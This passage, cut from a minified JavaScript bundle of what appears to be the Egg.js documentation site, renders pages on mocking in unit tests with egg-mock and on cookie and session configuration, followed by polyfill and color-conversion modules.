\u6765\u6a21\u62df\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,"\u53c8\u5982\u6211\u60f3\u6a21\u62df\u4e00\u6b21\u8bf7\u6c42\u7684 Session \u6570\u636e\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.mockSession(data)")," \u6765\u6a21\u62df\u3002"),r.a.createElement(o["a"],{code:"describe('GET /session', () => {\n  it('should mock session work', () => {\n    app.mockSession({\n      foo: 'bar',\n      uid: 123,\n    });\n    return app\n      .httpRequest()\n      .get('/session')\n      .expect(200)\n      .expect({\n        session: {\n          foo: 'bar',\n          uid: 123,\n        },\n      });\n  });\n});",lang:"js"}))),r.a.createElement("p",null,"\u56e0\u4e3a mock \u4e4b\u540e\u4f1a\u4e00\u76f4\u751f\u6548\uff0c\u6211\u4eec\u9700\u8981\u907f\u514d\u6bcf\u4e2a\u5355\u5143\u6d4b\u8bd5\u7528\u4f8b\u4e4b\u95f4\u662f\u4e0d\u80fd\u76f8\u4e92 mock \u6c61\u67d3\u7684\uff0c \u6240\u4ee5\u901a\u5e38\u6211\u4eec\u90fd\u4f1a\u5728 ",r.a.createElement("code",null,"afterEach")," \u94a9\u5b50\u91cc\u9762\u8fd8\u539f\u6389\u6240\u6709 mock\u3002"),r.a.createElement(o["a"],{code:"describe('some test', () => {\n  // before hook\n\n  afterEach(mock.restore);\n\n  // it tests\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5f15\u5165 ",r.a.createElement("code",null,"egg-mock/bootstrap")," \u65f6\uff0c\u4f1a\u81ea\u52a8\u5728 ",r.a.createElement("code",null,"afterEach")," \u94a9\u5b50\u4e2d\u8fd8\u539f\u6240\u6709\u7684 mock\uff0c\u4e0d\u9700\u8981\u5728\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u518d\u6b21\u7f16\u5199\u3002")),r.a.createElement("p",null,"\u4e0b\u9762\u4f1a\u8be6\u7ec6\u89e3\u91ca\u4e00\u4e0b egg-mock \u7684\u5e38\u89c1\u4f7f\u7528\u573a\u666f\u3002"),r.a.createElement("h3",{id:"mock-\u5c5e\u6027\u548c\u65b9\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#mock-\u5c5e\u6027\u548c\u65b9\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock \u5c5e\u6027\u548c\u65b9\u6cd5"),r.a.createElement("p",null,"\u56e0\u4e3a egg-mock \u662f\u6269\u5c55\u81ea ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/mm"},"mm")," \u6a21\u5757\uff0c \u5b83\u5305\u542b\u4e86 mm \u7684\u6240\u6709\u529f\u80fd\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730 mock \u4efb\u610f\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u4e86\u3002"),r.a.createElement("h4",{id:"mock-\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027"},r.a.createElement(l["AnchorLink"],{to:"#mock-\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock \u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027"),r.a.createElement("p",null,"mock ",r.a.createElement("code",null,"app.config.baseDir")," \u6307\u5411 ",r.a.createElement("code",null,"/tmp/mockapp")),r.a.createElement(o["a"],{code:"mock(app.config, 'baseDir', '/tmp/mockapp');\nassert(app.config.baseDir === '/tmp/mockapp');",lang:"js"}),r.a.createElement("h4",{id:"mock-\u4e00\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#mock-\u4e00\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock \u4e00\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5"),r.a.createElement("p",null,"mock ",r.a.createElement("code",null,"fs.readFileSync")," \u8fd4\u56de ",r.a.createElement("code",null,"hello world")),r.a.createElement(o["a"],{code:"mock(fs, 'readFileSync', (filename) => {\n  return 'hello world';\n});\nassert(fs.readFileSync('foo.txt') === 'hello world');",lang:"js"}),r.a.createElement("p",null,"\u8fd8\u6709 ",r.a.createElement("code",null,"mock.data()"),"\uff0c",r.a.createElement("code",null,"mock.error()")," \u7b49\u66f4\u591a\u9ad8\u7ea7\u7684 mock \u65b9\u6cd5\uff0c \u8be6\u7ec6\u4f7f\u7528\u8bf4\u660e\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/mm#api"},"mm API"),"\u3002"),r.a.createElement("h3",{id:"mock-service"},r.a.createElement(l["AnchorLink"],{to:"#mock-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock Service"),r.a.createElement("p",null,"Service \u4f5c\u4e3a\u6846\u67b6\u6807\u51c6\u7684\u5185\u7f6e\u5bf9\u8c61\uff0c\u6211\u4eec\u63d0\u4f9b\u4e86\u4fbf\u6377\u7684 ",r.a.createElement("code",null,"app.mockService(service, methodName, fn)")," \u6a21\u62df Service \u65b9\u6cd5\u8fd4\u56de\u503c\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u6a21\u62df ",r.a.createElement("code",null,"app/service/user")," \u4e2d\u7684 ",r.a.createElement("code",null,"get(name)")," \u65b9\u6cd5\uff0c\u8ba9\u5b83\u8fd4\u56de\u4e00\u4e2a\u672c\u6765\u4e0d\u5b58\u5728\u7684\u7528\u6237\u6570\u636e\u3002"),r.a.createElement(o["a"],{code:"it('should mock fengmk1 exists', () => {\n  app.mockService('user', 'get', () => {\n    return {\n      name: 'fengmk1',\n    };\n  });\n\n  return (\n    app\n      .httpRequest()\n      .get('/user?name=fengmk1')\n      .expect(200)\n      // \u8fd4\u56de\u4e86\u539f\u672c\u4e0d\u5b58\u5728\u7684\u7528\u6237\u4fe1\u606f\n      .expect({\n        name: 'fengmk1',\n      })\n  );\n});",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"app.mockServiceError(service, methodName, error)")," \u53ef\u4ee5\u6a21\u62df Service \u8c03\u7528\u5f02\u5e38\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u6a21\u62df ",r.a.createElement("code",null,"app/service/user")," \u4e2d\u7684 ",r.a.createElement("code",null,"get(name)")," \u65b9\u6cd5\u8c03\u7528\u5f02\u5e38\uff1a"),r.a.createElement(o["a"],{code:"it('should mock service error', () => {\n  app.mockServiceError('user', 'get', 'mock user service error');\n  return (\n    app\n      .httpRequest()\n      .get('/user?name=fengmk2')\n      // service \u5f02\u5e38\uff0c\u89e6\u53d1 500 \u54cd\u5e94\n      .expect(500)\n      .expect(/mock user service error/)\n  );\n});",lang:"js"}),r.a.createElement("h3",{id:"mock-httpclient"},r.a.createElement(l["AnchorLink"],{to:"#mock-httpclient","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock HttpClient"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"./httpclient"},"HttpClient"),"\uff0c\u5e94\u7528\u53d1\u8d77\u7684\u5bf9\u5916 HTTP \u8bf7\u6c42\u57fa\u672c\u90fd\u662f\u901a\u8fc7\u5b83\u6765\u5904\u7406\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.mockHttpclient(url, method, data)")," \u6765 mock \u6389 ",r.a.createElement("code",null,"app.curl")," \u548c ",r.a.createElement("code",null,"ctx.curl")," \u65b9\u6cd5\uff0c \u4ece\u800c\u5b9e\u73b0\u5404\u79cd\u7f51\u7edc\u5f02\u5e38\u60c5\u51b5\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\u5728 ",r.a.createElement("code",null,"app/controller/home.js")," \u4e2d\u53d1\u8d77\u4e86\u4e00\u4e2a curl \u8bf7\u6c42"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async httpclient() {\n    const res = await this.ctx.curl('https://eggjs.org');\n    this.ctx.body = res.data.toString();\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u9700\u8981 mock \u5b83\u7684\u8fd4\u56de\u503c\uff1a"),r.a.createElement(o["a"],{code:"describe('GET /httpclient', () => {\n  it('should mock httpclient response', () => {\n    app.mockHttpclient('https://eggjs.org', {\n      // \u6a21\u62df\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u662f buffer / string / json\uff0c\n      // \u90fd\u4f1a\u8f6c\u6362\u6210 buffer\n      // \u6309\u7167\u8bf7\u6c42\u65f6\u7684 options.dataType \u6765\u505a\u5bf9\u5e94\u7684\u8f6c\u6362\n      data: 'mock eggjs.org response',\n    });\n    return app\n      .httpRequest()\n      .get('/httpclient')\n      .expect('mock eggjs.org response');\n  });\n});",lang:"js"}),r.a.createElement("h2",{id:"\u793a\u4f8b\u4ee3\u7801"},r.a.createElement(l["AnchorLink"],{to:"#\u793a\u4f8b\u4ee3\u7801","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u793a\u4f8b\u4ee3\u7801"),r.a.createElement("p",null,"\u5b8c\u6574\u793a\u4f8b\u4ee3\u7801\u53ef\u4ee5\u5728 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/blob/master/unittest"},"eggjs/exmaples/unittest")," \u627e\u5230\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"glQ/":function(e,t){function n(t){return e.exports=n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e.exports.__esModule=!0,e.exports["default"]=e.exports,n(t)}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},h22t:function(e,t,n){var a=n("0mt+"),r=n("FsiO");a({target:"Number",stat:!0,forced:Number.parseFloat!=r},{parseFloat:r})},hDVP:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"cookie"},r.a.createElement(l["AnchorLink"],{to:"#cookie","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cookie"),r.a.createElement("p",null,"HTTP is a stateless protocol. But web applications often need to identify the sender of requests. To solve this problem, HTTP protocol defines a header ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/HTTP_cookie"},"Cookie"),". Web servers can use response header ",r.a.createElement("code",null,"Set-Cookie")," to send small data to clients. Clients (e.g. web browsers) store the data according to protocol, and attach the cookie data in future requests. For security reason, browsers only attach cookies in the requests that are sent to the same domain. Web servers can use ",r.a.createElement("code",null,"Domain")," and ",r.a.createElement("code",null,"Path")," attributes to define the scope of the cookie."),r.a.createElement("p",null,"By using ",r.a.createElement("code",null,"ctx.cookies"),", we can easily and safely read/set cookies in controller."),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async add() {\n    const ctx = this.ctx;\n    let count = ctx.cookies.get('count');\n    count = count ? Number(count) : 0;\n    ctx.cookies.set('count', ++count);\n    ctx.body = count;\n  }\n  async remove() {\n    const ctx = this.ctx;\n    ctx.cookies.set('count', null);\n    ctx.status = 204;\n  }\n}",lang:"js"}),r.a.createElement("h4",{id:"ctxcookiessetkey-value-options"},r.a.createElement(l["AnchorLink"],{to:"#ctxcookiessetkey-value-options","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.cookies.set(key, value, options)")),r.a.createElement("p",null,"Modifying Cookie is done by setting ",r.a.createElement("code",null,"Set-Cookie")," header in HTTP responses. Each ",r.a.createElement("code",null,"Set-Cookie")," creates a key-value pair in client. Besides of setting the value of Cookie, HTTP protocol supports more attributes to control the transfer, storage and permission of Cookie."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"{","Number","}"," maxAge"),": set the lifetime of the cookie in milliseconds. It's the milliseconds since server's \"Now\". Client discards a cookie after specified lifetime."),r.a.createElement("li",null,r.a.createElement("code",null,"{","Date","}"," expires"),": set the expiration time of the cookie. If ",r.a.createElement("code",null,"maxAge")," is defined, ",r.a.createElement("code",null,"expires")," will be ignored. If neither is defined, Cookie will expire when client session expires, usually it's the time client closed."),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," path"),": set the path of the cookie. By default it's on root path (",r.a.createElement("code",null,"/"),"), which means all URL under the current domain have access to the cookie."),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," domain"),": set the domain of the cookie. By default, it's not defined. If defined, only specified domain have access to the cookie."),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," httpOnly"),": set whether the cookie can be accessed by Javascript. By default it's ",r.a.createElement("code",null,"true"),", which means Javascript cannot access the cookie."),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," secure"),": set whether the cookie can only be accessed under HTTPS. See ",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/13729749/how-does-cookie-secure-flag-work"},"explanation")," for details. Egg.js auto sets this value to true if the current request is sent over HTTPS.")),r.a.createElement("p",null,"In addition to these standard Cookie attributes, egg.js supports 3 more parameters:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," overwrite"),": set the way of handling same Cookie key. If true, earlier called values will be overwritten by the last call; otherwise HTTP response will contain multiple ",r.a.createElement("code",null,"Set-Cookie")," headers with the same key."),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," signed"),": set whether the cookie should be signed. If true, the value of the cookie will be signed. So that when the value is being read, server verifies the signature to prevent cookie values modified by client. By default it's true."),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," encrypt"),": set whether the cookie should be encrypted. It true, the cookie value will be encrypted before sending to clients so user clients cannot get raw text of the cookie. By default it's false.")),r.a.createElement("p",null,"When using Cookie, we need to have a clear idea of the purpose of the cookie, how long it needs to be stored in client, can it be accessed by JS, can it be modified by client."),r.a.createElement("p",null,r.a.createElement("strong",null,"By default, Cookie is signed but not encrypted, client can see raw content but cannot modify it (manually).")),r.a.createElement("ul",null,r.a.createElement("li",null,"If you need to allow JS to access and modify Cookie:")),r.a.createElement(o["a"],{code:"ctx.cookies.set(key, value, {\n  httpOnly: false,\n  signed: false,\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"If you don't want to allow JS to access and modify Cookie:")),r.a.createElement(o["a"],{code:"ctx.cookies.set(key, value, {\n  httpOnly: true, // by default it's true\n  encrypt: true, // cookies are encrypted during network transmission\n});",lang:"js"}),r.a.createElement("p",null,"Note:"),r.a.createElement("ol",null,r.a.createElement("li",null,"Due to ",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/7567154/can-i-use-unicode-characters-in-http-headers"},"the uncertainty of client's implementation"),", to ensure Cookie can be stored successfully, it's recommended to encode cookie value in base64 or other codec."),r.a.createElement("li",null,"Due to ",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/640938/what-is-the-maximum-size-of-a-web-browsers-cookies-key"},"the limitation of Cookie length on client side"),", do avoid using long Cookie. Generally speaking, no more than 4093 bytes. When Cookie value's length is greater than this value, egg.js prints a warning in log.")),r.a.createElement("h4",{id:"ctxcookiesgetkey-options"},r.a.createElement(l["AnchorLink"],{to:"#ctxcookiesgetkey-options","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.cookies.get(key, options)")),r.a.createElement("p",null,"As HTTP Cookie is sent over header, we can use this method to easily retrieve the value of given key from Cookie. If ",r.a.createElement("code",null,"options.signed")," and ",r.a.createElement("code",null,"options.encrypt")," has been configured to sign and encrypt Cookie, the corresponding options also need to be used in ",r.a.createElement("code",null,"get")," method."),r.a.createElement("ul",null,r.a.createElement("li",null,"If ",r.a.createElement("code",null,"signed")," is true when ",r.a.createElement("code",null,"set")," Cookie but false when ",r.a.createElement("code",null,"get")," Cookie, egg.js doesn't verify Cookie value, so the value could have been modified by client."),r.a.createElement("li",null,"If ",r.a.createElement("code",null,"encrypt")," is true when ",r.a.createElement("code",null,"set")," Cookie but false when ",r.a.createElement("code",null,"get")," Cookie, what you get is encrypted text rather than the raw plain text.")),r.a.createElement("p",null,"If you want to get the cookie set by frontend or other system, you need to specify the parameter ",r.a.createElement("code",null,"signed")," as ",r.a.createElement("code",null,"false"),", avoid varify the cookie and not getting the vlaue."),r.a.createElement(o["a"],{code:"ctx.cookies.get('frontend-cookie', {\n  signed: false,\n});",lang:"js"}),r.a.createElement("h3",{id:"cookie-secret-key"},r.a.createElement(l["AnchorLink"],{to:"#cookie-secret-key","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cookie Secret Key"),r.a.createElement("p",null,"Since we need to sign and encrypt Cookie, a secret key is required. In ",r.a.createElement("code",null,"config/config.default.js"),":"),r.a.createElement(o["a"],{code:"module.exports = {\n  keys: 'key1,key2',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"keys")," is defined as a string, several keys separated by commas. When egg.js processes Cookie:"),r.a.createElement("ul",null,r.a.createElement("li",null,"the first key is used in encryption and signature generation."),r.a.createElement("li",null,"to decrypt or verify signature, egg.js iterates through all keys.")),r.a.createElement("p",null,"If you need to update Cookie secret key and don't want to invalidate existing clients' Cookie, you can add new secret key at the front of ",r.a.createElement("code",null,"keys"),". After some time, when existing Cookie has expired, delete the old secret keys."),r.a.createElement("h2",{id:"session"},r.a.createElement(l["AnchorLink"],{to:"#session","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session"),r.a.createElement("p",null,"In web applications, Cookie is usually used to identify users. So the concept of Session, which is built on top of Cookie, was created to specifically handle user identification."),r.a.createElement("p",null,"Egg.js built-in supports Session through ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session"},"egg-session")," plugin. We can use ",r.a.createElement("code",null,"ctx.session")," to read or modify current user session."),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async fetchPosts() {\n    const ctx = this.ctx;\n    // get content from session\n    const userId = ctx.session.userId;\n    const posts = await ctx.service.post.fetch(userId);\n    // modify session value\n    ctx.session.visited = ctx.session.visited ? ctx.session.visited + 1 : 1;\n    ctx.body = {\n      success: true,\n      posts,\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"It is very intuitive to use Session, simply get or set. To delete a session, set its value to null:"),r.a.createElement(o["a"],{code:"exports.deleteSession = function* (ctx) {\n  ctx.session = null;\n};",lang:"js"}),r.a.createElement("p",null,"What you need to pay special attention to is that you need to avoid the following situations when setting session properties (which can cause field loss, See for details ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/session/blob/master/lib/session.js#L37-L47"},"koa-session source code"),"):"),r.a.createElement("ul",null,r.a.createElement("li",null,"Don't start with ",r.a.createElement("code",null,"_")),r.a.createElement("li",null,"Don't use ",r.a.createElement("code",null,"isNew"))),r.a.createElement(o["a"],{code:"// \u274c Wrong way\nctx.session._visited = 1; //   --\x3e property will lost\nctx.session.isNew = 'HeHe'; //   --\x3e session keyword, should not write it\n\n// \u2714\ufe0f Right way\nctx.session.visited = 1; //   --\x3e  Everything is all right",lang:"js"}),r.a.createElement("p",null,"Session is built on top of Cookie. By default, the content of Session is stored in a Cookie field as encrypted string. Every time a client sends requests to server, the cookie is attached in requests. Egg.js passes decrypted cookie to server code. The default configuration of Session is:"),r.a.createElement(o["a"],{code:"exports.session = {\n  key: 'EGG_SESS',\n  maxAge: 24 * 3600 * 1000, // 1 day\n  httpOnly: true,\n  encrypt: true,\n};",lang:"js"}),r.a.createElement("p",null,"The attributes except of ",r.a.createElement("code",null,"key")," are all standard Cookie attributes.",r.a.createElement("code",null,"key")," is the key of the cookie that stores session content. With default config, the session cookie is encrypted, not accessible to JS, which ensures user cannot access or modify it."),r.a.createElement("h3",{id:"store-session-in-other-storage"},r.a.createElement(l["AnchorLink"],{to:"#store-session-in-other-storage","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Store Session in Other Storage"),r.a.createElement("p",null,"Session is stored in Cookie by default. If a session is too big, there are some troubles."),r.a.createElement("ul",null,r.a.createElement("li",null,"as mentioned above, clients usually have limitation on Cookie length. When session is too big, a client may refuse to store it."),r.a.createElement("li",null,"Cookie is attached in every request. If session is too big, the additional cost of sending session may be significant.")),r.a.createElement("p",null,"Egg.js supports to store Session in other places. To config it, you can simply set ",r.a.createElement("code",null,"app.sessionStore"),"."),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.sessionStore = {\n    // support promise / async\n    async get(key) {\n      // return value;\n    },\n    async set(key, value, maxAge) {\n      // set key to store\n    },\n    async destroy(key) {\n      // destroy key\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"The implementation of ",r.a.createElement("code",null,"sessionStore")," can also be encapsulated into a plugin. For example, ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session-redis"},"egg-session-redis")," stores Session in Redis. To apply it, import ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-redis"},"egg-redis")," and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session-redis"},"egg-session-redis")," plugin in your application."),r.a.createElement(o["a"],{code:"// plugin.js\nexports.redis = {\n  enable: true,\n  package: 'egg-redis',\n};\nexports.sessionRedis = {\n  enable: true,\n  package: 'egg-session-redis',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: once you choose to store Session in external storage, it means your system heavily depends on the external storage. Once it's down, Session feature won't work. So it's recommended to put only necessary information in Session, keep Session minimum and use the default Cookie storage if possible. Do not put per-user's data cache in Session.")),r.a.createElement("h3",{id:"session-practice"},r.a.createElement(l["AnchorLink"],{to:"#session-practice","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session Practice"),r.a.createElement("h4",{id:"set-sessions-expiration-time"},r.a.createElement(l["AnchorLink"],{to:"#set-sessions-expiration-time","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Set Session's Expiration Time"),r.a.createElement("p",null,"Session config has a attribute ",r.a.createElement("code",null,"maxAge"),", which controls global expiration time of all sessions of the application."),r.a.createElement("p",null,"We often can see a ",r.a.createElement("strong",null,"Remember Me")," option on a lot of websites' login page. If it's selected, Session of this logged in user can live longer. This kind of per-user session expiration time can be set through ",r.a.createElement("code",null,"ctx.session.maxAge"),":"),r.a.createElement(o["a"],{code:"const ms = require('ms');\nclass UserController extends Controller {\n  async login() {\n    const ctx = this.ctx;\n    const { username, password, rememberMe } = ctx.request.body;\n    const user = await ctx.loginAndGetUser(username, password);\n\n    // set Session\n    ctx.session.user = user;\n    // if user selected `Remember Me`, set expiration time to 30 days\n    if (rememberMe) ctx.session.maxAge = ms('30d');\n  }\n}",lang:"js"}),r.a.createElement("h4",{id:"extend-sessions-expiration-time"},r.a.createElement(l["AnchorLink"],{to:"#extend-sessions-expiration-time","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Session's Expiration Time"),r.a.createElement("p",null,"By default, if user requests don't result in modification of Session, egg.js doesn't extend expiration time of the session. But in some scenarios, we hope that if users visit our site for a long time, then extend their session validity and not let the user exit the login state. The framework provides a ",r.a.createElement("code",null,"renew")," configuration item to implement this feature. It will reset the session's validity period when it finds that the user's session is half the maximum validity period."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  session: {\n    renew: true,\n  },\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},hHTQ:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("npLq"),o=n("Xdqv"),i=n("V3tB"),c=n("j9ts"),s=n("qkIw"),u=n("AzF/"),d=!!l&&o((function(){l.prototype["finally"].call({then:function(){}},(function(){}))}));a({target:"Promise",proto:!0,real:!0,forced:d},{finally:function(e){var t=c(this,i("Promise")),n="function"==typeof e;return this.then(n?function(n){return s(t,e()).then((function(){return n}))}:e,n?function(n){return s(t,e()).then((function(){throw n}))}:e)}}),r||"function"!=typeof l||l.prototype["finally"]||u(l.prototype,"finally",i("Promise").prototype["finally"])},hOjR:function(e,t,n){var a=n("9Rcy"),r=n("Xdqv"),l=n("31yA"),o=Object.defineProperty,i={},c=function(e){throw e};e.exports=function(e,t){if(l(i,e))return i[e];t||(t={});var n=[][e],s=!!l(t,"ACCESSORS")&&t.ACCESSORS,u=l(t,0)?t[0]:c,d=l(t,1)?t[1]:void 0;return i[e]=!!n&&!r((function(){if(s&&!a)return!0;var e={length:-1};s?o(e,1,{enumerable:!0,get:c}):e[1]=1,n.call(e,u,d)}))}},hUmh:function(e,t,n){"use strict";n.d(t,"i",(function(){return r})),n.d(t,"g",(function(){return l})),n.d(t,"b",(function(){return i})),n.d(t,"h",(function(){return c})),n.d(t,"c",(function(){return s})),n.d(t,"f",(function(){return u})),n.d(t,"j",(function(){return d})),n.d(t,"a",(function(){return p})),n.d(t,"e",(function(){return h})),n.d(t,"d",(function(){return g}));var a=n("Lcxk");function r(e,t,n){return{r:255*Object(a["a"])(e,255),g:255*Object(a["a"])(t,255),b:255*Object(a["a"])(n,255)}}function l(e,t,n){e=Object(a["a"])(e,255),t=Object(a["a"])(t,255),n=Object(a["a"])(n,255);var r=Math.max(e,t,n),l=Math.min(e,t,n),o=0,i=0,c=(r+l)/2;if(r===l)i=0,o=0;else{var s=r-l;switch(i=c>.5?s/(2-r-l):s/(r+l),r){case e:o=(t-n)/s+(t<n?6:0);break;case t:o=(n-e)/s+2;break;case n:o=(e-t)/s+4;break;default:break}o/=6}return{h:o,s:i,l:c}}function o(e,t,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?e+6*n*(t-e):n<.5?t:n<2/3?e+(t-e)*(2/3-n)*6:e}function i(e,t,n){var r,l,i;if(e=Object(a["a"])(e,360),t=Object(a["a"])(t,100),n=Object(a["a"])(n,100),0===t)l=n,i=n,r=n;else{var c=n<.5?n*(1+t):n+t-n*t,s=2*n-c;r=o(s,c,e+1/3),l=o(s,c,e),i=o(s,c,e-1/3)}return{r:255*r,g:255*l,b:255*i}}function c(e,t,n){e=Object(a["a"])(e,255),t=Object(a["a"])(t,255),n=Object(a["a"])(n,255);var r=Math.max(e,t,n),l=Math.min(e,t,n),o=0,i=r,c=r-l,s=0===r?0:c/r;if(r===l)o=0;else{switch(r){case e:o=(t-n)/c+(t<n?6:0);break;case t:o=(n-e)/c+2;break;case n:o=(e-t)/c+4;break;default:break}o/=6}return{h:o,s:s,v:i}}function s(e,t,n){e=6*Object(a["a"])(e,360),t=Object(a["a"])(t,100),n=Object(a["a"])(n,100);var r=Math.floor(e),l=e-r,o=n*(1-t),i=n*(1-l*t),c=n*(1-(1-l)*t),s=r%6,u=[n,i,o,o,c,n][s],d=[c,n,n,i,o,o][s],m=[o,o,c,n,n,i][s];return{r:255*u,g:255*d,b:255*m}}function u(e,t,n,r){var l=[Object(a["e"])(Math.round(e).toString(16)),Object(a["e"])(Math.round(t).toString(16)),Object(a["e"])(Math.round(n).toString(16))];return r&&l[0].startsWith(l[0].charAt(1))&&l[1].startsWith(l[1].charAt(1))&&l[2].startsWith(l[2].charAt(1))?l[0].charAt(0)+l[1].charAt(0)+l[2].charAt(0):l.join("")}function d(e,t,n,r,l){var o=[Object(a["e"])(Math.round(e).toString(16)),Object(a["e"])(Math.round(t).toString(16)),Object(a["e"])(Math.round(n).toString(16)),Object(a["e"])(m(r))];return l&&o[0].startsWith(o[0].charAt(1))&&o[1].startsWith(o[1].charAt(1))&&o[2].startsWith(o[2].charAt(1))&&o[3].startsWith(o[3].charAt(1))?o[0].charAt(0)+o[1].charAt(0)+o[2].charAt(0)+o[3].charAt(0):o.join("")}function m(e){return Math.round(255*parseFloat(e)).toString(16)}function p(e){return h(e)/255}function h(e){return parseInt(e,16)}function g(e){return{r:e>>16,g:(65280&e)>>8,b:255&e}}},hVei:function(e,t,n){"use strict";var a=n("oyD1"),r=n("PE5i");e.exports=function(e){if("string"!==e&&"number"!==e&&"default"!==e)throw TypeError("Incorrect hint");return r(a(this),"number"!==e)}},hb7R:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("G9w8"),s=n("j9ts"),u=n("AOzO"),d=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{filter:function(e){var t=o(this),n=u(t),a=c(e,arguments.length>1?arguments[1]:void 0,3),r=new(s(t,l("Map"))),m=i(r.set);return d(n,(function(e,n){a(n,e,t)&&m.call(r,e,n)}),void 0,!0,!0),r}})},hdNB:function(e,t,n){var 